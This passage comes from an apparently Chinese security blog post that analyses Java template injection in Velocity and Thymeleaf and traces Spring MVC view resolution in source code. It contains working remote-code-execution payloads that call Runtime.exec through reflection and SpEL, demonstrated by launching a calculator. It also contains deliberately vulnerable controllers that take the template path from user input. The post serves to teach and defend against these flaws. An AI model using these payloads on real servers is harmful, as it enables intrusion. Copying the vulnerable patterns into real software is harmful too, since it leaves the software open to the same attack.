<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#set($e=&quot;e&quot;)：定义了一个Velocity变量$e，并赋值为字符串&quot;e&quot;。</span><br><span class="hljs-variable">$e</span>.getClass()：获取变量<span class="hljs-variable">$e</span>的运行时类。<br>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)：通过反射加载java.lang.Runtime类。<br>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, null)：使用反射获取Runtime类的getRuntime方法，该方法返回Runtime类的实例。<br>.invoke(null, null)：使用反射调用getRuntime方法，参数为null，因为该方法不接受任何参数。这将返回Runtime类的实例。<br>.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;open -a calculator&quot;</span>)：使用Runtime类的实例的<span class="hljs-built_in">exec</span>方法执行操作系统命令。在这里，命令是open -a calculator，即打开Mac的计算器<br>windows一般使用Calc即可<br></code></pre></td></tr></table></figure>

<p>运行主程序，看到计算器成功弹出</p>
<p><img src="/img/ssti(java)/ssti22.png" srcset="/img/loading.gif" lazyload></p>
<p>根据测试程序，首先会进入Velocity类的init方法，在此处下断点</p>
<p>在该方法中，会调用RuntimeSingleton类的init方法，这个方法主要是对模板引擎的初始化，比如设置属性、初始化日志系统、资源管理器、指令等。</p>
<p><img src="/img/ssti(java)/ssti23.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来回到主程序中，实例化VelocityContext，并将三对键值对put进去，之后调用Velocity类的evaluate方法，此时templateString的值为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hello, <span class="hljs-comment">#set($e=&quot;e&quot;)</span><br><span class="hljs-variable">$e</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;Calc&quot;</span>) | Full name: <span class="hljs-variable">$name</span>, phone: <span class="hljs-variable">$phone</span>, email: <span class="hljs-variable">$email</span><br></code></pre></td></tr></table></figure>

<p>下一步进入了RuntimeInstance的evaluate方法-&gt;进入重载的evaluate方法</p>
<p>这个方法会调用RuntimeInstance类的parse方法进行解析。</p>
<p>经过两重调用来到org&#x2F;apache&#x2F;velocity&#x2F;runtime&#x2F;parser&#x2F;Parser.class的parse方法。</p>
<p>完成模板文件的parse工作后，生成ast语法树结构</p>
<p><img src="/img/ssti(java)/ssti24.png" srcset="/img/loading.gif" lazyload></p>
<p>当执行来到engine.evaluate；我们跟进去，直接就看到了RuntimeInstance.evaluate；最后会调用 render 方法将解析后的内容渲染到 writer 中，并返回渲染结果</p>
<p><img src="/img/ssti(java)/ssti25.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进到render；这里主要实现的是将解析后的节点树渲染到指定的写入器中。</p>
<p>首先在729行调用 nodeTree.init对节点树进行初始化。接着调用 nodeTree.render将节点树渲染到写入器中。</p>
<p><img src="/img/ssti(java)/ssti26.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进去到render。这里主要实现的是获取节点树的子节点数量，并使用 for 循环遍历所有子节点。通过 jjtGetChild(i) 方法获取第 i 个子节点，并调用其 render 方法来渲染子节点内容到指定的写入器中。</p>
<p><img src="/img/ssti(java)/ssti27.png" srcset="/img/loading.gif" lazyload></p>
<p>继续跟进jjtGetChild(i).render；最后来到了ASTReference.render.</p>
<p>先判断this.referenceType 的值是否为 4；然后判断this.escaped 的值为false</p>
<p><img src="/img/ssti(java)/ssti28.png" srcset="/img/loading.gif" lazyload></p>
<p>继续跟进来之后，就到了ASTMethod.execute。这里接受一个 Object 对象和一个 InternalContextAdapter 对象作为参数。我们直接看到</p>
<p>调用 method.invoke(o, params) 方法执行方法调用，并将结果存储在 obj 变量中。</p>
<p><img src="/img/ssti(java)/ssti30.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进去查看invoke；判断方法是否为可变参数方法，如果是就进行一系列操作。最后调用doInvoke方法执行实际的方法调用，并返回结果。</p>
<p>而doInvoke方法，正是下面的doInvoke方法，可以看到getClass方法已经作为参数被传入</p>
<p><img src="/img/ssti(java)/ssti31.png" srcset="/img/loading.gif" lazyload></p>
<p>最后调用了Java反射里面的invoke，进行执行</p>
<p><img src="/img/ssti(java)/ssti32.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="merge触发"><a href="#merge触发" class="headerlink" title="merge触发"></a>merge触发</h5><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p>
<p>创建一个servlet</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.garck3h.controller;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VelocityInjectionController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/merge&quot;)</span><br>   <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">merge</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 从请求参数中获取模板值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;template&quot;</span>);<br><br>        <span class="hljs-comment">// 从classpath中加载Velocity模板</span><br>        <span class="hljs-type">VelocityEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityEngine</span>();<br>        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="hljs-string">&quot;classpath&quot;</span>);<br>        engine.setProperty(<span class="hljs-string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());<br>        engine.init();<br><br>        <span class="hljs-comment">// 动态创建Velocity上下文并设置参数</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        context.put(<span class="hljs-string">&quot;params&quot;</span>, request.getParameterMap());<br><br>        <span class="hljs-comment">// 进行模板合并</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> engine.getTemplate(template);<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        tpl.merge(context, sw);<br><br>        <span class="hljs-comment">// 创建ModelAndView对象，指定视图名为&quot;hello&quot;</span><br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-comment">// 将模板合并的结果作为属性添加到ModelAndView对象中</span><br>        modelAndView.addObject(<span class="hljs-string">&quot;hello&quot;</span>, sw.toString());<br>        <span class="hljs-comment">// 返回ModelAndView对象</span><br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>模板能够插入语句时，传入payload，可以正常执行</p>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><ul>
<li>因为Spring框架版本的问题，高版本不能直接整合Velocity模板，一直报错</li>
<li>Velocity模板目前也逐渐被其它模板引擎替代</li>
</ul>
<h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><ul>
<li>Thymeleaf是目前最流行的模板引擎</li>
</ul>
<h3 id="Thymeleaf语法"><a href="#Thymeleaf语法" class="headerlink" title="Thymeleaf语法"></a>Thymeleaf语法</h3><p>Thymeleaf 表达式可以有以下类型：</p>
<ul>
<li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li>
<li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li>
<li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li>
<li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。</li>
<li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li>
</ul>
<p>实际上，Thymeleaf 出现 SSTI 问题的主要原因也正是因为这个片段表达式，我们知道片段表达式语法如下：</p>
<ul>
<li><strong><code>~&#123;templatename::selector&#125;</code></strong>，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></li>
</ul>
<p>如有一个 html 文件的代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;banquan&quot;</span>&gt;</span> <span class="hljs-symbol">&amp;copy;</span> 2021 ThreeDream yyds<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后在另一template中可以通过片段表达式引用该片段：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;footer :: banquan&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>th:insert</code>和<code>th:replace:</code>插入片段是比较常见的用法</p>
<ol>
<li><code>~&#123;templatename&#125;</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
</ol>
<p>这个也比较好理解，不做详细举例</p>
<ol start="2">
<li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li>
</ol>
<p>在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。</p>
<ol start="3">
<li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li>
</ol>
<h3 id="Thymeleaf-SSTI注入漏洞"><a href="#Thymeleaf-SSTI注入漏洞" class="headerlink" title="Thymeleaf SSTI注入漏洞"></a>Thymeleaf SSTI注入漏洞</h3><h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>只有3.x版本的Thymeleaf 才会受到影响，因为在2.x 中<code>renderFragment</code>的核心处理方法是这样的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderFragment</span><span class="hljs-params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br>                <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> viewTemplateEngine.getConfiguration();<br>                <span class="hljs-type">ProcessingContext</span> <span class="hljs-variable">processingContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessingContext</span>(context);<br>                templateCharacterEncoding = getStandardDialectPrefix(configuration);<br>                <span class="hljs-type">StandardFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="hljs-string">&quot;fragment&quot;</span>);<br>                <span class="hljs-keyword">if</span> (fragment == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <br>        ...<br></code></pre></td></tr></table></figure>

<p>并没有3.x 版本中对于片段表达式（<code>~&#123;</code>）的处理，也因此不会造成 SSTI 漏洞，以下是 SpringBoot 默认引用的 thymeleaf 版本</p>
<blockquote>
<p>spring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5<br>spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9<br>spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11</p>
</blockquote>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>主要参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></p>
<p>这里直接使用<a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation">veracode-research&#x2F;spring-view-manipulation(github.com)</a>项目来做复现				</p>
<p>漏洞代码</p>
<p>此控制器原本用于更改页面语言</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br></code></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure>

<p>运行程序后顺利弹出计算器</p>
<p><img src="/img/ssti(java)/ssti33.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p>
<p>此漏洞同样被触发在模板视图渲染时</p>
<p>通过前两个对模板的视图解析与渲染代码分析，我们可以看到开始渲染调用的是render方法，Velocity调用<code>VelocityView#render</code>渲染，FreeMarker调用&#96;&#96;FreeMarker#render<code>渲染，同样Thymeleaf调用</code>ThymleafView#render&#96;渲染。</p>
<p><code>render</code>方法中又通过调用<code>renderFragment</code>完成实际的渲染工作。</p>
<p>在这里详细分析Thymeleaf的渲染工作</p>
<p>createView() 首先根据视图名创建对应的View</p>
<p>之后开始渲染，如果此处是 FreeMarker，就会去 <code>FreeMarkerView.render()</code>，如果是 Velocity，就会去 <code>VelocityView.render()</code>，我们此处是 Thymeleaf，会去到 <code>ThymeleafView.render()</code>，跟进。</p>
<p>跟进 <code>renderFragment()</code> 方法。在第 100 行，判断 <code>getTemplateName</code> 当中是否存在 <code>::</code> 这一字符，如果不存在就当作是一个普通的模板，直接赋值给 <code>templateName</code>，并清空 <code>markupSelectors</code>。</p>
<p>所以payload末尾需要加::，并且在前面介绍~{}语法时提到：：后是需要有值(也就是<code>selector</code>)，所以末尾是.x</p>
<p><img src="/img/ssti(java)/ssti47.png" srcset="/img/loading.gif" lazyload></p>
<p>继续往下走，第 108 行，调用了 <code>(FragmentExpression)parser.parseExpression()</code>，对我们输入的这一串字符进行了处理。</p>
<p><img src="/img/ssti(java)/ssti48.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/ssti(java)/ssti49.png" srcset="/img/loading.gif" lazyload></p>
<p>继续跟进 <code>StandardExpressionPreprocessor.preprocess()</code></p>
<p>复制出了比较关键的一段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> String <span class="hljs-title function_">preprocess</span><span class="hljs-params">(IExpressionContext context, String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input.indexOf(<span class="hljs-number">95</span>) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> input;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">IStandardExpressionParser</span> <span class="hljs-variable">expressionParser</span> <span class="hljs-operator">=</span> StandardExpressions.getExpressionParser(context.getConfiguration());<br>            <span class="hljs-keyword">if</span> (!(expressionParser <span class="hljs-keyword">instanceof</span> StandardExpressionParser)) &#123;<br>                <span class="hljs-keyword">return</span> input;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);<br>                <span class="hljs-keyword">if</span> (!matcher.find()) &#123;<br>                    <span class="hljs-keyword">return</span> checkPreprocessingMarkUnescaping(input);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">strBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(input.length() + <span class="hljs-number">24</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">curr</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>先判断，input 里面是否有存在 <code>_</code> 字符，如果不存在则直接返回，不做解析处理。</p>
<p>接着，调用 <code>PREPROCESS_EVAL_PATTERN.matcher(input);</code>，进行正则提取，这里提取的是 <code>_</code> 中间的内容。</p>
<p>提取后获取到的内容是 <code>$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;</code></p>
<p>此语句是被当作SpEL表达式执行的</p>
<p>因此 POC 中我们要构造形如<code>__xx__</code>的SpEL表达式（SpEL相关的知识点可以参考此文：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1694/">SPEL 表达式注入漏洞深入分析</a>），即表达式要为：<code>__$&#123;xxxxx&#125;__</code> 这种形式</p>
<p>因此，最终 POC 的形式就为：<code>__$&#123;xxxx&#125;__::.x</code></p>
<p>继续往下走，到了 <code>expression.execute()</code>，也就是命令执行的地方，语句就变成了</p>
<p><img src="/img/ssti(java)/ssti50.png" srcset="/img/loading.gif" lazyload></p>
<p>至此分析过程结束。</p>
<h3 id="Thymeleaf-SSTI-Bypass"><a href="#Thymeleaf-SSTI-Bypass" class="headerlink" title="Thymeleaf SSTI Bypass"></a>Thymeleaf SSTI Bypass</h3><p>详情请见：<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
<li>配置<code>@ResponseBody</code>或者<code>@RestController</code>，经以上注解后不会进行View解析而是直接返回。</li>
<li>在方法参数中加上 <code>HttpServletResponse</code>参数 ，此时spring会认为已经处理了response响应而不再进行视图解析。</li>
<li>在返回值前面加上 “<code>redirect:</code>“——经<code>RedirectView</code>处理。</li>
</ol>
<h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>在controller漏洞代码处下断点，可以看到若有完整的MVC框架，经过的调用栈都是相同的</p>
<p><img src="/img/ssti(java)/ssti34.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/ssti(java)/ssti35.png" srcset="/img/loading.gif" lazyload></p>
<p>所以以Thymeleaf为例尝试分析一下SpringMVC 视图解析过程</p>
<p>此处其实是涉及到的后端知识较多</p>
<p>参考：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021848063#item-2-4">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></p>
<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>首先，让我们从 Spring MVC 的四大组件:<strong>前端控制器（DispatcherServlet）、处理器映射器（HandlerMapping）、处理器适配器（HandlerAdapter）以及视图解析器（ViewResolver）</strong> 的角度来看一下 Spring MVC 对用户请求的处理过程，过程如下图所示:</p>
<p><img src="https://img-blog.csdnimg.cn/20200221001135320.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><ol>
<li>用户请求发送到<strong>前端控制器 DispatcherServlet</strong>。</li>
<li>前端控制器 DispatcherServlet 接收到请求后，DispatcherServlet 会使用 HandlerMapping 来处理，<strong>HandlerMapping 会查找到具体进行处理请求的 Handler 对象</strong>。</li>
<li>HandlerMapping 找到对应的 Handler 之后，并不是返回一个 Handler 原始对象，而是一个 Handler 执行链（HandlerExecutionChain），在这个执行链中包括了拦截器和处理请求的 Handler。HandlerMapping 返回一个执行链给 DispatcherServlet。</li>
<li>DispatcherServlet 接收到执行链之后，会<strong>调用 Handler 适配器去执行 Handler</strong>。</li>
<li>Handler 适配器执行完成 Handler（也就是 Controller）之后会得到一个 ModelAndView，并返回给 DispatcherServlet。</li>
<li>DispatcherServlet 接收到 HandlerAdapter 返回的 ModelAndView 之后，会根据其中的视图名调用 ViewResolver。</li>
<li><strong>ViewResolver 根据逻辑视图名解析成一个真正的 View 视图</strong>，并返回给 DispatcherServlet。</li>
<li>DispatcherServlet 接收到视图之后，会根据上面的 ModelAndView 中的 model 来进行视图中数据的填充，也就是所谓的<strong>视图渲染</strong>。</li>
<li>渲染完成之后，DispatcherServlet 就可以将结果返回给用户了。</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>首先当我们访问页面的时候，将会把请求发送到<strong>前端控制器 DispatcherServlet</strong>，DispatcherServlet 是一个 Servlet，我们知道在 Servlet 在处理一个请求的时候会交给 service 方法进行处理，这里也不例外，DispatcherServlet 继承了 FrameworkServlet，首先进入 FrameworkServlet 的 <strong>service</strong> 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-comment">// 请求方法</span><br>    <span class="hljs-type">HttpMethod</span> <span class="hljs-variable">httpMethod</span> <span class="hljs-operator">=</span> HttpMethod.resolve(request.getMethod());<br>    <span class="hljs-comment">// 若方法为 PATCH 方法或为空则单独处理</span><br>    <span class="hljs-keyword">if</span> (httpMethod == HttpMethod.PATCH || httpMethod == <span class="hljs-literal">null</span>) &#123;<br>        processRequest(request, response);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 其他的请求类型的方法经由父类，也就是 HttpServlet 处理</span><br>        <span class="hljs-built_in">super</span>.service(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>HttpServlet 中会根据请求类型的不同分别调用 doGet 或者 doPost 等方法，FrameworkServlet 中已经重写了这些方法，在这些方法中会调用 processRequest 进行处理，在 processRequest 中会调用 <strong>doService</strong> 方法，这个 doService 方法就是在 DispatcherServlet 中实现的。下面就看下 DispatcherServlet 中的 doService 方法的实现。</p>
<h4 id="DispatcherServlet-收到请求"><a href="#DispatcherServlet-收到请求" class="headerlink" title="DispatcherServlet 收到请求"></a>DispatcherServlet 收到请求</h4><p>在doService处下一个断点开始调试</p>
<p>看到417行调用了doDispatch 方法</p>
<p>首先会获取当前请求的 <strong>Handler 执行链</strong>，然后找到合适的 <strong>HandlerAdapter</strong>（此处为 RequestMappingHandlerAdapter），接着调用 RequestMappingHandlerAdapter 的 <strong>handle</strong> 方法，如下为 doDispatch 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 